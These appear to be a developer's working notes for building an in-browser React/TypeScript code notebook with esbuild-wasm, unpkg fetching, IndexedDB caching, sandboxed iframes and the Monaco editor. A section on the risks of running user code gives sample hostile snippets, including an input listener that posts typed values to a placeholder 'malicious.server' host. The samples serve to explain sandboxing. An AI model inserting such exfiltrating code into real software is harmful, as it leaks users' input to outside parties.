npx create-react-app jbook-revise --template typescript
npm install --save-exact esbuild-wasm@0.8.27

# delete all files in src folder

touch index.tsx

npm start

## Transpiling

# A temporary step.
# copy the ./node_modules/esbuild-wasm/esbuild.wasm to ./public (~11MB)
cp ./node_modules/esbuild-wasm/esbuild.wasm ./public

# https://esbuild.github.io
# Refer above for the documentation on esbuild


## Bundling
# Create a plugin which hijacks the module retrieval process
    - Reach out to npm registry to get the link for modules
    - Fetch the modules

# View npm link from CLI
npm view react dist.tarball

# We use unpkg to open the tgz file that we download using the link
# https://unpkg.com
# A public CDN

## Fetch packages from unpkg.com
# Test with package https://unpkg.com/tiny-test-pkg@1.0.0/index.js

# We will add axios to fetch the file from unpkg
npm install axios

## Implement caching layer
# We are going to use indexedDB
# We are going to use localforage library

npm install localforage

# Split the pluging into two: one for creating url and second loading package
# We need to specify css loader for css files and jsx for rest
# We need to provide an output path for css loader
#
# Trick used: (A workaround)
# We take CSS contents and put them inside the javascript
# The limitations: advanced features like nested imports, url links etc not supported.

TBD (Verify):
Check and see if the outputFiles generated by esbuild now provide the css file.

# We need to escape CSS snippets.

## Load esbuild.wasm from the unpkg instead of putting it in public folder

# A simple eval function is inadequate as the asynchronous calls might happen later
# which might not be caught.

The problems with the user provided code:
 - It might throw errors
 - It might mutate dom
 - It might run malicious code provided by other user.

Examples of breaking code:
document.body.innerHTML = '';

axios.post('https://malicious-server.com', {
});

document.querySelector('input').addEventListener('change', (event) => {
    axios.post('malicious.server', {
        value: event.target.value
    });
});

## Addition of iframes to preview User Code
# We will create an iframe element inside our App component
# We can isolate the iframe element from rest of the application. This contains any
# damages to the main page

# The default settings allow communication between the parent frame and child frame.
# Use document.querySelector('iframe').contentWindow.b
# We need to sandbox an iframe. Use allow-scripts to see it in console.
# Use allow-same-origin to get direct access from parent
# <iframe title="userCode" sandbox="allow-script allow-same-origin" src="./test.html" />

# Create a local address jbook.local which resolves to 127.0.0.1
# So we will load the test.html using http://jbook.local:3000/test.html

## iframe Security: we will use sandbox="",
# We will use iframe with srcDocs
# There is a limitation:
# The users are not going to be able to use localStorage, cookies
#

## We package the generated script in html tag and pass it to iframe via srcDoc
const html = `
<script>
    ${code}
</script>
`

## Running unescaped code with a <script> ... </script> tag in it messes things.
# Some browsers restrict length of attribute srcDoc in case generated code is too long.
# Also the following code will break
console.log('<script></script>');
# The </script> tag matches with the <script> tag defined in the html definition.

## Indirect communication between parent and iframe window
# Create a listener in top level window:
window.addEventListener('message', (e) => console.log(e), false);

We put following code in the input window
parent.postMessage('hello there', '*'); // * specifies domains that can receive message
parent.postMessage('hello there', 'google.com'); // wouldn't work on http://localhost

The message is received at the parent.
# So we create an iframe and start listening for events from parent
# When we receive code we update
# So we avoid passing long code via srcDoc
# Also the code is shared as a string instead of an html snippet.

# The new way of getting the generated code in iframe and executing it is working
# Given below is the source of iframe passed via srcDoc to it.
    const html = `\
    <html>
    <head></head>
    <body>
        <div id="root"></div>
        <script>
            window.addEventListener('message', (event) => {
              eval(event.data);
            }, false);
        </script>
    </body>
    </html>
    `;

# Now we will try creating a react component and running it.
# We will use the div with id root for the same.

# When we enter the following react code in the input window
import React from 'react';
import ReactDOM from 'react-dom';

const App = () => <h1>Hi there!</h1>

ReactDOM.render(
  <App/>,
  document.querySelector('#root')
);

## It works !!!

## Error handling in input code
# We reset the iframe DOM before the next execution.
# This makes sure that we get saved from any errors caused by previous execution

## EagerBundling: supported with a flag

## Monaco Editor: need to use --legacy-peer-deps
npm install --save-exact @monaco-editor/react@3.7.5 --legacy-peer-deps

The open source options:
CodeMirror
Ace Editor
Monaco Editor
https://www.npmjs.com/package/@monaco-editor/react
Two options: Editor and Diff Editor
We are going to use Editor

# Install monaco-editor package just to view its type definitions
npm install  monaco-editor --legacy-peer-deps
# Need to set options in editor
# Need to support onChange kind of function in editor
# Add npm package prettier to our editor to add code formatter
npm install prettier @types/prettier --legacy-peer-deps

## Add styling in our project. we will use bulma
npm install bulmaswatch --legacy-peer-deps
In index.tsx add:
import 'bulmaswatch/superhero/bulmaswatch.min.css';

## To make monaco-jsx-highlighter and jscodeshift work we need to downgrade to react-scripts "4.0.1"
rm package-lock.json
rm -r node_modules
npm install --legacy-peer-deps

## JSX highlighting in Monaco Editor
npm install --save-exact monaco-jsx-highlighter@0.0.15 jscodeshift@0.11.0 @types/jscodeshift@0.7.2 --legacy-peer-deps

We create a src/types.d.ts and add following to override typescript error.
declare module 'monaco-jsx-highlighter';
We used the custom created syntax.css for the code

